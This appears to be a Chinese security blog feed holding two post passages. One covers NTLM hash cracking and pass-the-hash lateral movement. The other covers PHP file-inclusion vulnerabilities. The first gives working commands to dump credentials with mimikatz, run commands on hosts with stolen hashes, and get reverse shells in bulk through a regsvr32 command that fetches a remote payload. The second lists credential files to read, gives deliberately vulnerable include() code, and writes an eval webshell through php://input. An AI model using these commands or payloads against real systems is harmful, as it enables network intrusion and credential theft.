<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">LM：3000 </span><br><span class="line">NTLM：1000</span><br><span class="line">NetNTLMv1：5500</span><br><span class="line">NetNTLMv2：5600</span><br></pre></td></tr></table></figure>

<p>NTLMv1的格式为：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">username::hostname:LM response:NTLM response:challenge</span><br></pre></td></tr></table></figure>

<p>构造后的数据如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">log1::WIN-BH7SVRRDGVA:fec9b082080e34ba00000000000000000000000000000000:51acb9f9909f0e3c4254c332f5e302a38429c5490206bc04:8d2da0f5e21e20ee</span><br></pre></td></tr></table></figure>

<p>Hashcat参数如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hashcat -m 5500 log1::WIN-BH7SVRRDGVA:fec9b082080e34ba00000000000000000000000000000000:51acb9f9909f0e3c4254c332f5e302a38429c5490206bc04:8d2da0f5e21e20ee /tmp/password.list -o found.txt --force</span><br></pre></td></tr></table></figure>

<p>下面，使用Hashcat对该Net-NTLM hash进行破解。NTLMv2的格式为：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">username::domain:challenge:HMAC-MD5:blob</span><br></pre></td></tr></table></figure>

<blockquote>
<p>值得一提的是，在真实渗透环境下，由于密码复杂度限制，一般我们获取到的<code>NTML-HASH</code>很难直接破解出明文密码，这种情况下我们需要采用其他技术继续进行横向渗透。</p>
</blockquote>
<h4 id="2-Pass-The-Hash"><a href="#2-Pass-The-Hash" class="headerlink" title="2.Pass-The-Hash"></a>2.Pass-The-Hash</h4><p>哈希传递是能够在不需要账户明文密码的情况下完成认证的一个技术。渗透中当我们获取不到明文密码，或者破解不了NTLM Hash的情况下，哈希传递攻击能够使我们利用这些哈希继续进行横向渗透。</p>
<p>常用<code>Pass-The-Hash</code>工具： </p>
<ul>
<li>Crackmapexec</li>
<li>Mimikatz</li>
<li>smbmap</li>
<li>smbexec</li>
<li>metasploit</li>
<li>cobaltstrike</li>
</ul>
<h5 id="Crackmapexec"><a href="#Crackmapexec" class="headerlink" title="Crackmapexec"></a><a href="https://github.com/byt3bl33d3r/CrackMapExec" target="_blank" rel="noopener">Crackmapexec</a></h5><p>1.安装 crackmapexec</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-get install crackmapexec</span><br><span class="line">(pip install crackmapexec)</span><br></pre></td></tr></table></figure>

<p>2.使用 crackmapexec</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cme smb -h</span><br></pre></td></tr></table></figure>

<p>批量扫描探测命令：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cme smb <span class="number">17.10</span><span class="number">.0</span><span class="number">.10</span>/<span class="number">24</span></span><br><span class="line">cme smb <span class="number">17.10</span><span class="number">.0</span><span class="number">.10</span> -u administrator -H hash.txt</span><br><span class="line">cme smb <span class="number">17.10</span><span class="number">.0</span><span class="number">.100</span><span class="number">-200</span> -u administrator -H AFC44EE7351D61D00698796DA06B1EBF</span><br></pre></td></tr></table></figure>

<p>执行命令：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cme smb <span class="number">17.10</span><span class="number">.0</span><span class="number">.10</span>  -u administrator -p toor(明文密码) -x whoami</span><br><span class="line">cme smb <span class="number">17.10</span><span class="number">.0</span><span class="number">.10</span>  -u administrator -H afc44ee7351d61d00698796da06b1ebf -x whoami</span><br></pre></td></tr></table></figure>

<p>其他参数</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">--shares    <span class="comment">#枚举共享和访问权限</span></span><br><span class="line">--sessions    <span class="comment">#枚举活动会话</span></span><br><span class="line">--disks        <span class="comment">#枚举磁盘</span></span><br><span class="line">--sam         <span class="comment">#dump目标系统中的SAM哈希值</span></span><br><span class="line">--loggedon-users    <span class="comment">#枚举登录用户</span></span><br><span class="line">--users [USER]        <span class="comment">#枚举域用户(如果指定了用户只查询其信息)</span></span><br><span class="line">--groups [GROUP]        <span class="comment">#枚举域组(如果指定了组其成员被列举)</span></span><br><span class="line">--<span class="built_in">local</span>-groups [GROUP]  <span class="comment">#如果指定了组则枚举本地组其成员被列举</span></span><br><span class="line">--<span class="built_in">local</span>-groups [GROUP]    <span class="comment">#枚举本地组，如果指定了组，则枚举其成员</span></span><br><span class="line">-x COMMAND                <span class="comment">#执行指定的命令</span></span><br><span class="line">-X PS_COMMAND            <span class="comment">#执行指定的PowerShell命令</span></span><br><span class="line"></span><br><span class="line">-L， --list-modules    <span class="comment">#列出可用的拓展功能模块</span></span><br><span class="line">--options    <span class="comment">#查看模块选项</span></span><br><span class="line">-M MODULE， --module MODULE     <span class="comment">#使用拓展功能模块</span></span><br><span class="line">-o MODULE_OPTION [MODULE_OPTION ...] <span class="comment">#设置模块选项</span></span><br></pre></td></tr></table></figure>

<p>GETSHELL</p>
<p>利用拓展功能模块，我们可以方便地getshell。我们可以使用<code>cme smb -L</code>命令查看所有<code>moudules</code>，对应的物理路径为：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">/usr/local/lib/python2<span class="number">.7</span>/dist-packages/crackmapexec<span class="number">-4.0</span><span class="number">.1</span>.dev0-py2<span class="number">.7</span>.egg/cme/modules</span><br></pre></td></tr></table></figure>

<p>其中提供的<code>met_inject.py</code>模块可以使目标下载执行<code>Meterpreter stager</code>，我们先来看下模块需要的参数：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cme smb -M met_inject --options</span><br><span class="line">[*] met_inject module options:</span><br><span class="line">    LHOST    IP hosting the handler</span><br><span class="line">    LPORT    Handler port</span><br><span class="line">    PAYLOAD  Payload to inject: reverse_http or reverse_https (default:reverse_https)</span><br><span class="line">    PROCID   Process ID to inject into (default: current powershell process)</span><br></pre></td></tr></table></figure>

<p>这是一个<code>http</code>或<code>https</code>的反弹shell，我们使用默认的<code>reverse_https</code>，提供需要的<code>LHOST</code>和<code>LPORT</code>的参数即可：</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">cme<span class="built_in"> smb </span>17.10.0.10-150 -u administrator -H AFC44EE7351D61D00698796DA06B1EBF -M met_inject -o <span class="attribute">LHOST</span>=17.10.0.1 <span class="attribute">LPORT</span>=9999</span><br></pre></td></tr></table></figure>

<p>命令的意思是通过pass-the-hash批量攻击<code>17.10.0.10-17.10.0.150</code>网段的主机，并使其执行meterpreter的https反弹shell。</p>
<p>笔者测试时遇到问题，无法用<code>met_inject.py</code>模块正常getshell，不知道什么原因。因此选择直接通过命令执行getlshell。利用metasploit的<code>web_delivery</code>模块：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use exploit/multi/script/web_delivery</span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST 17.10.0.1</span><br><span class="line"><span class="built_in">set</span> LPORT 9999</span><br><span class="line"><span class="built_in">set</span> target 3</span><br><span class="line">run</span><br><span class="line">[*] Exploit running as background job 0.</span><br><span class="line">[*] Started reverse TCP handler on 17.10.0.1:9999 </span><br><span class="line">[*] Using URL: http://0.0.0.0:8080/1KZkey</span><br><span class="line">[*] Local IP: http://10.204.146.152:8080/1KZkey</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Run the following <span class="built_in">command</span> on the target machine:</span><br><span class="line">regsvr32 /s /n /u /i:http://17.10.0.1:8080/1KZkey.sct scrobj.dll</span><br></pre></td></tr></table></figure>

<p>通过pass-the-hash执行命令批量getshell</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cme smb 17.10.0.10-15 -u administrator -H AFC44EE7351D61D00698796DA06B1EBF -x <span class="string">"regsvr32 /s /n /u /i:http://17.10.0.1:8080/1KZkey.sct scrobj.dll"</span></span><br></pre></td></tr></table></figure>



<h5 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a><a href="https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/" target="_blank" rel="noopener">Metasploit</a></h5><p>search <code>psexec</code>，<code>smblogin</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use exploit/windows/smb/psexec </span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/bind_tcp</span><br><span class="line"><span class="built_in">set</span> RHOST 17.10.0.10</span><br><span class="line"><span class="built_in">set</span> smbuser administrator</span><br><span class="line"><span class="built_in">set</span> smbpass AAD3B435B51404EEAAD3B435B51404EE:AFC44EE7351D61D00698796DA06B1EBF</span><br><span class="line">exploit</span><br><span class="line"></span><br><span class="line">use exploit/windows/smb/psexec_psh</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/bind_tcp</span><br><span class="line"><span class="built_in">set</span> RHOST 17.10.0.10</span><br><span class="line"><span class="built_in">set</span> smbuser administrator</span><br><span class="line"><span class="built_in">set</span> smbpass AAD3B435B51404EEAAD3B435B51404EE:AFC44EE7351D61D00698796DA06B1EBF</span><br></pre></td></tr></table></figure>

<p>举例：</p>
<h5 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a><a href="https://github.com/gentilkiwi/mimikatz/releases" target="_blank" rel="noopener">Mimikatz</a></h5><p>先抓取hash</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mimikatz.exe <span class="string">""</span>privilege::debug<span class="string">""</span> <span class="string">""</span>sekurlsa::logonpasswords<span class="string">""</span></span><br></pre></td></tr></table></figure>

<p>得到hash之后：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sekurlsa::pth /user:Administrator /domain:ssooking-pc /ntlm:AFC44EE7351D61D00698796DA06B1EBF</span><br></pre></td></tr></table></figure>

<h5 id="wmiexec-py"><a href="#wmiexec-py" class="headerlink" title="wmiexec.py"></a><a href="https://github.com/CoreSecurity/impacket/blob/master/examples/wmiexec.py" target="_blank" rel="noopener">wmiexec.py</a></h5><p>exe 版本下载<a href="https://github.com/maaaaz/impacket-examples-windows" target="_blank" rel="noopener">链接</a></p>
<p>windows 管理规范<code>WMI</code>，实际上就是windows从<code>03/XP</code>开始就内置了这个系统插件。其设计初衷之一是为了管理员能更加方便的对远程windows主机进行各种日常管理。</p>
<p>严格来说它其实是为各种服务提供一个统一的调用接口，比如你想操作什么服务就去调用对应的服务类中的方法去执行你的操作。在渗透测试中，它意味着我们可以直接在本地操作远程目标机器上的进程、服务、注册表等包括其它一系列特权操作，wmi是一把在目标内网进行横向移动的非常趁手的武器。<code>wmiexec</code>是一个python2脚本，对windows自带的wmic做了一些强化，让渗透变得更容易。</p>
<p>只能说很多工具吧，比较好用的在这里介绍两种：</p>
<p>wmiexec的注释中提示”Main advantage here is it runs under the user (has to be Admin) account”，经实际测试普通用户权限即可。wmiexec的hash参数格式为<code>LMHASH:NTHASH</code>，由于该Hash来自于Server 2008，系统默认不支持LM hash，所以LM hash可以设定为任意值。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wmiexec.py -hashes 00000000000000000000000000000000:AFC44EE7351D61D00698796DA06B1EBF ssookinging-pc/administrator@17.10.0.10 <span class="string">"whoami"</span></span><br></pre></td></tr></table></figure>



<h5 id="Powershell"><a href="#Powershell" class="headerlink" title="Powershell"></a>Powershell</h5><p><a href="https://github.com/Kevin-Robertson/Invoke-TheHash" target="_blank" rel="noopener">https://github.com/Kevin-Robertson/Invoke-TheHash</a></p>
<p><a href="https://github.com/Kevin-Robertson/Invoke-TheHash/" target="_blank" rel="noopener">Invoke-WMIExec</a></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Invoke-WMIExec</span> <span class="literal">-Target</span> <span class="number">17.10</span>.<span class="number">0.10</span> <span class="literal">-Domain</span> test.local <span class="literal">-Username</span> test1 <span class="literal">-Hash</span> AFC44EE7351D61D00698796DA06B1EBF <span class="literal">-Command</span> <span class="string">"calc.exe"</span> <span class="literal">-verbose</span></span><br></pre></td></tr></table></figure>

<p>Invoke-SMBExec</p>
<p>通过在目标主机创建服务执行命令，所以权限为system</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Invoke-SMBExec</span> <span class="literal">-Target</span> <span class="number">192.168</span>.<span class="number">0.2</span> <span class="literal">-Domain</span> ssookinging<span class="literal">-pc</span> <span class="literal">-Username</span> test1 <span class="literal">-Hash</span> <span class="number">7</span>ECFFFF0C3548187607A14BAD0F88BB1 <span class="literal">-Command</span> <span class="string">"calc.exe"</span> <span class="literal">-verbose</span></span><br></pre></td></tr></table></figure>

<h5 id="Invoke-SMBClient："><a href="#Invoke-SMBClient：" class="headerlink" title="Invoke-SMBClient："></a>Invoke-SMBClient：</h5><p>支持SMB1, SMB2 (2.1), and SMB signing</p>
<p>如果只有SMB文件共享的权限，没有远程执行权限，可以使用该脚本</p>
<p>支持的功能包括列举目录、上传文件、下载文件、删除文件(具体权限取决于该口令hash的权限)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Invoke-SMBExec -Target 192.168.0.102 -Domain workgroup -Username administrator -Hash 03bebb338e70244589ea67c7439c77ba -Command <span class="string">"notepad.exe"</span> -verbose</span><br></pre></td></tr></table></figure>

<h5 id="PTH-EXEC"><a href="#PTH-EXEC" class="headerlink" title="PTH-EXEC"></a>PTH-EXEC</h5><p>kali中自带的横向移动pth的工具，pth-winexe就是其中一个，还有与其类似的：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pth-winexe -U workgroup/administrator%AAD3B435B51404EEAAD3B435B51404EE:AFC44EE7351D61D00698796DA06B1EBF //17.10.0.10 cmd.exe</span><br><span class="line"></span><br><span class="line">pth-winexe -U administrator%AAD3B435B51404EEAAD3B435B51404EE:AFC44EE7351D61D00698796DA06B1EBF //17.10.0.11 cmd.exe</span><br></pre></td></tr></table></figure>



<h3 id="五、防御思路"><a href="#五、防御思路" class="headerlink" title="五、防御思路"></a>五、防御思路</h3><p>结合攻击方法，总结防御思路如下：</p>
<ul>
<li>检查特殊文件.scf 和 desktop.ini，避免被添加UNC路径</li>
<li>如无特殊需要，建议配置防火墙规则禁止139和445端口</li>
</ul>
<h3 id="六、后渗透思路拓展"><a href="#六、后渗透思路拓展" class="headerlink" title="六、后渗透思路拓展"></a>六、后渗透思路拓展</h3><ul>
<li>内网欺骗劫持</li>
<li>钓鱼文件</li>
<li>后门命令</li>
<li>拿下一台文件服务器后，在上面创建图标、desktop.ini、link、url等</li>
<li><a href="https://www.secpulse.com/archives/72190.html" target="_blank" rel="noopener">pass the hash with RDP</a></li>
<li>获取域控</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf&gt; run post/windows/gather/credentials/gpp</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>内网与域渗透学习</category>
      </categories>
      <tags>
        <tag>NTML</tag>
      </tags>
  </entry>
  <entry>
    <title>文件包含漏洞学习笔记</title>
    <url>/2020/04/03/wen-jian-bao-han-lou-dong-xue-xi-bi-ji/</url>
    <content><![CDATA[<h2 id="文件包含漏洞学习"><a href="#文件包含漏洞学习" class="headerlink" title="文件包含漏洞学习"></a>文件包含漏洞学习</h2><h4 id="文件包含漏洞相关知识点"><a href="#文件包含漏洞相关知识点" class="headerlink" title="文件包含漏洞相关知识点"></a>文件包含漏洞相关知识点</h4><h5 id="什么是文件包含？"><a href="#什么是文件包含？" class="headerlink" title="什么是文件包含？"></a>什么是文件包含？</h5><p>​       服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP执行，这会为开发者节省大量的时间。这意味着您可以创建供所有网页引用的标准页眉或菜单文件。当页眉需要更新时，您只更新一个包含文件就可以了，或者当您向网站添加一张新页面时，仅仅需要修改一下菜单文件（而不是更新所有网页中的链接）。</p>
<h5 id="文件包含函数"><a href="#文件包含函数" class="headerlink" title="文件包含函数"></a>文件包含函数</h5><ul>
<li>require()</li>
<li>require_once()</li>
<li>include()</li>
<li>include_once()</li>
</ul>
<p><strong><code>include</code>和<code>require</code>区别</strong>:<code>include</code>在包含的过程中如果出现错误，会抛出一个警告，程序继续正常运行；而<code>require</code>函数出现错误的时候，会直接报错并退出程序的执行。</p>
<p>而<code>include_once()</code>，<code>require_once()</code>这两个函数，与前两个的不同之处在于这两个函数只包含一次，适用于在脚本执行期间同一个文件有可能被包括超过一次的情况下，你想确保它只被包括一次以避免函数重定义，变量重新赋值等问题。</p>
<p><img src="/2020/04/03/wen-jian-bao-han-lou-dong-xue-xi-bi-ji/9272355-7889a572371b18c8.png" alt></p>
<h5 id="漏洞产生的原因"><a href="#漏洞产生的原因" class="headerlink" title="漏洞产生的原因"></a>漏洞产生的原因</h5><p>文件包含函数加载的参数没有经过过滤或者严格的定义，可以被用户控制，包含其他恶意文件，导致执行了非预期的代码。</p>
<p>示例代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">       $filename=$GET[<span class="string">'filename'</span>];</span><br><span class="line">       <span class="keyword">include</span>($filename);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>$_GET[&#39;filename&#39;]</code>参数开发者没有经过严格的过滤，直接带入了include的函数，攻击者可以修改<code>$_GET[&#39;filename&#39;]</code>的值，执行非预期的操作。</p>
<h4 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h4><p>文件包含分为：本地(LFI)/远程(RFI)包含</p>
<p>本地文件包含漏洞，顾名思义，指的是能打开并包含本地文件的漏洞。大部分情况下遇到的文件包含漏洞都是LFI。简单的测试用例如前所示。</p>
<p>远程文件包含漏洞。是指能够包含远程服务器上的文件并执行。由于远程服务器的文件是我们可控的，因此漏洞一旦存在危害性会很大。<br> 但RFI的利用条件较为苛刻，需要php.ini中进行配置</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">allow_url_fopen &#x3D; On</span><br><span class="line">allow_url_include &#x3D; On，重启apache，即可生效</span><br></pre></td></tr></table></figure>

<p>两个配置选项均需要为On，才能远程包含文件成功。<br> 另外一台需要开启apache</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line">apt-<span class="keyword">get</span> install apache2</span><br><span class="line"> /etc/<span class="keyword">init</span>.d/apache2 start</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/03/wen-jian-bao-han-lou-dong-xue-xi-bi-ji/9272355-952116d80dc7f768%5B1%5D.png" alt></p>
<p><img src="/2020/04/03/wen-jian-bao-han-lou-dong-xue-xi-bi-ji/9272355-e288840e08e52b5e%5B1%5D.png" alt></p>
<p> 注：在php.ini中，allow_url_fopen默认一直是On，而<code>allow_url_include</code>从php5.2之后就默认为Off。<br> 下面例子中测试代码均为：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">    <span class="keyword">include</span> $file;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>allow_url_fopen 默认为 On<br> allow_url_include 默认为 Off<br> 若有特殊要求，会在利用条件里指出。</p>
<h4 id="本地文件包含漏洞"><a href="#本地文件包含漏洞" class="headerlink" title="本地文件包含漏洞"></a>本地文件包含漏洞</h4><h5 id="一、无限制本地文件包含漏洞"><a href="#一、无限制本地文件包含漏洞" class="headerlink" title="一、无限制本地文件包含漏洞"></a>一、无限制本地文件包含漏洞</h5><p><strong>测试代码：</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $filename =$_GET[<span class="string">'filename'</span>];</span><br><span class="line">    <span class="keyword">include</span>($filename);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>常见的敏感信息目录：</strong></p>
<p>window系统：</p>
<ul>
<li>c:\boot.ini //查看系统版本</li>
<li>c:\windows\system32\inetsrv\MetaBase.xml //IIS配置</li>
<li>c:\windows\repair\sam  // 存储Windows系统初次安装的密码</li>
<li>c:\ProgramFiles\mysql\my.ini // MySQL配置</li>
<li>c:\ProgramFiles\mysql\data\mysql\user.MYD // MySQL root密码</li>
<li>c:\windows\php.ini // php 配置信息</li>
</ul>
<p>Linux系统</p>
<ul>
<li>/etc/passwd // 账户信息</li>
<li>/etc/shadow // 账户密码文件</li>
<li>/usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件</li>
<li>/etc/my.conf // mysql 配置文件</li>
</ul>
<h5 id="二、session文件包含漏洞"><a href="#二、session文件包含漏洞" class="headerlink" title="二、session文件包含漏洞"></a>二、session文件包含漏洞</h5><p><strong>利用条件</strong></p>
<p>1.我们可以通过phpinfo的信息泄露获取到session的存储位置</p>
<p><img src="/2020/04/03/wen-jian-bao-han-lou-dong-xue-xi-bi-ji/QQ%E6%88%AA%E5%9B%BE20200123104312.png" alt></p>
<p>2.或者通过猜测默认的session存放位置</p>
<p>linux下的默认存储目录为/var/lib/php/session</p>
<p><strong>利用过程</strong></p>
<p>我们可以先使用文件包含上传恶意代码，比如</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">$ctfs=$_GET[<span class="string">'ctfs'</span>];</span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="string">"username"</span>]=$ctfs;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>此php会将获取到的GET型ctfs变量的值存入到session中。如果存在本地文件包含漏洞，就可以通过ctfs写入恶意代码到session文件中，然后通过文件包含漏洞执行此恶意代码。<br>我们构造：</p>
<img src="/2020/04/03/wen-jian-bao-han-lou-dong-xue-xi-bi-ji/QQ截图20200123104221.png" style="zoom:80%;">

<p>我们发现在本地session所在目录下存储了session的值</p>
<img src="/2020/04/03/wen-jian-bao-han-lou-dong-xue-xi-bi-ji/QQ截图20200123105708.png" style="zoom:80%;">

<p>攻击者通过phpinfo()信息泄露或者猜测获取到session存放的目录位置，然后通过浏览器自带开发者模式获取到文件名称：sess_lotipf7ccidsbsrltdau35rb65</p>
<img src="/2020/04/03/wen-jian-bao-han-lou-dong-xue-xi-bi-ji/QQ截图20200123103711.png" style="zoom:150%;">

<p>构造本地文件包含 ：<strong>file.php?D:\phpStudy\PHPTutorial\tmp\tmp\sess_lotipf7ccidsbsrltdau35rb65</strong></p>
<p><img src="/2020/04/03/wen-jian-bao-han-lou-dong-xue-xi-bi-ji/QQ%E6%88%AA%E5%9B%BE20200123104500.png" alt></p>
<h5 id="三、有限制本地文件包含漏洞绕过"><a href="#三、有限制本地文件包含漏洞绕过" class="headerlink" title="三、有限制本地文件包含漏洞绕过"></a>三、有限制本地文件包含漏洞绕过</h5><p><strong>%00截断</strong></p>
<p>条件：magic_quotes_gpc=Off  并且php版本&lt;5.3.4</p>
<p><strong>测试代码</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $filename  = $_GET[<span class="string">'filename'</span>];</span><br><span class="line">    <span class="keyword">include</span>($filename . <span class="string">".html"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>当我们直接包含本地的test.txt时</p>
<img src="/2020/04/03/wen-jian-bao-han-lou-dong-xue-xi-bi-ji/QQ截图20200123113838.png" style="zoom:67%;">

<p>我们在test.txt加上%00进行截断</p>
<img src="/2020/04/03/wen-jian-bao-han-lou-dong-xue-xi-bi-ji/QQ截图20200123113851.png" style="zoom:67%;">







<p><strong>四、路径长度限制</strong></p>
<p>条件：windows OS,点号需要长于256；linuxOS 长于4096</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">windows下目录最大长度为<span class="number">256</span>字节，超出的部分会被丢弃；</span><br><span class="line">linux下目录最大长度为<span class="number">4096</span>字节，超出的部分会被丢弃。</span><br></pre></td></tr></table></figure>

<p>测试代码：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">   $filename =$_GET[<span class="string">'filename'</span>];</span></span><br><span class="line"><span class="php">   <span class="keyword">include</span>($filename . <span class="string">".html"</span>);</span></span><br><span class="line"><span class="php">   <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<h4 id="远程文件包含漏洞"><a href="#远程文件包含漏洞" class="headerlink" title="远程文件包含漏洞"></a>远程文件包含漏洞</h4><p>PHP的配置文件allow_url_fopen和allow_url_include设置为ON，include/require等包含函数可以加载远程文件，如果远程文件没经过严格的过滤，导致了执行恶意文件的代码，这就是远程文件包含漏洞。</p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">allow_url_fopen</span> = <span class="literal">On</span>（是否允许打开远程文件）</span><br><span class="line"><span class="attr">allow_url_include</span> = <span class="literal">On</span>（是否允许include/require远程文件）</span><br></pre></td></tr></table></figure>

<p>示例：</p>
<p>测试代码：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">    $filename  = $_GET[<span class="string">'filename'</span>];</span></span><br><span class="line"><span class="php">    <span class="keyword">include</span>($filename);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/03/wen-jian-bao-han-lou-dong-xue-xi-bi-ji/QQ%E6%88%AA%E5%9B%BE20200203191630.png" alt></p>
<h4 id="PHP伪协议在文件包含中的应用"><a href="#PHP伪协议在文件包含中的应用" class="headerlink" title="PHP伪协议在文件包含中的应用"></a>PHP伪协议在文件包含中的应用</h4><p>PHP带有很多内置URL风格的封装协议，可用于类似fopen()、copy()、file_exists()和filesize()的文件系统函数。除了这些封装协议、还能通过stream_wrapper_register() 来注册自定义的封装协议。</p>
<p><strong>php伪协议类别</strong></p>
<ul>
<li>file://    访问本地文件系统</li>
<li>http://   访问HTTP（s)网址</li>
<li>ftp://     访问FTP(s) URLs</li>
<li>php://      访问各个输入/输出流</li>
<li>zlib://     压缩流</li>
<li>data://  数据</li>
</ul>
<p><strong>php://filter(本地磁盘文件进行读取）</strong></p>
<p>元封装器，设计用于“数据流打开“时的”筛选过滤“应用，对本地磁盘文件进行读写。</p>
<p>用法：?filename=php://filter/convert.base64-encode/resource=xxx.php</p>
<p>条件：需要开启allow_url_fopen</p>
<p>示例：</p>
<p>本地新建file.php</p>
<p><img src="/2020/04/03/wen-jian-bao-han-lou-dong-xue-xi-bi-ji/QQ%E6%88%AA%E5%9B%BE20200128205700.png" alt></p>
<p>我们使用php伪协议在本地读取shell.php文件中的内容</p>
<p><img src="/2020/04/03/wen-jian-bao-han-lou-dong-xue-xi-bi-ji/QQ%E6%88%AA%E5%9B%BE20200128205953.png" alt></p>
<p>对得到的Base64进行解码即可。</p>
<p><strong>file://伪协议（读取文件内容）</strong></p>
<p>通过file协议可以访问本地文件系统，读取到文件的内容</p>
<p>示例：</p>
<img src="/2020/04/03/wen-jian-bao-han-lou-dong-xue-xi-bi-ji/QQ截图20200203184038.png" style="zoom:67%;">



<h5 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h5><p>可以访问请求的原始数据的只读流。即可以直接读取到POST上没有经过解析的原始数据。 enctype=”multipart/form-data” 的时候 php://input 是无效的。</p>
<p>用法：?file=php://input 数据利用POST传过去。</p>
<p>利用条件：</p>
<p>allow_url_include = On。<br> 对allow_url_fopen不做要求</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>phpinfo();<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?</span>php <span class="keyword">system</span>(<span class="string">'whoami'</span>);<span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?</span>php fputs(fopen(<span class="string">"shell.php"</span>,<span class="string">"w"</span>),<span class="string">"&lt;?php eval(\$_POST['caidao'];?&gt;)"</span>)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>包含姿势：</p>
<figure class="highlight delphi"><table><tr><td class="code"><pre><span class="line"><span class="keyword">index</span>.php</span><br><span class="line">?<span class="keyword">file</span>=php:<span class="comment">//input</span></span><br><span class="line"></span><br><span class="line">POST:</span><br><span class="line">&lt;? phpinfo();?&gt;</span><br></pre></td></tr></table></figure>

<h5 id="php-input-（读取POST数据）"><a href="#php-input-（读取POST数据）" class="headerlink" title="php://input （读取POST数据）"></a>php://input （读取POST数据）</h5><p>​      碰到file_get_contents()就要想到用php://input绕过，因为php伪协议也是可以利用http协议的，即可以使用POST方式传数据，具体函数意义下一项；</p>
<p>测试代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">"php://input"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<img src="/2020/04/03/wen-jian-bao-han-lou-dong-xue-xi-bi-ji/QQ截图20200203182852.png" style="zoom:67%;">

<h5 id="php-input-命令执行"><a href="#php-input-命令执行" class="headerlink" title="php://input(命令执行)"></a>php://input(命令执行)</h5><p>测试代码：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">    $filename  = $_GET[<span class="string">'filename'</span>];</span></span><br><span class="line"><span class="php">    <span class="keyword">include</span>($filename);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

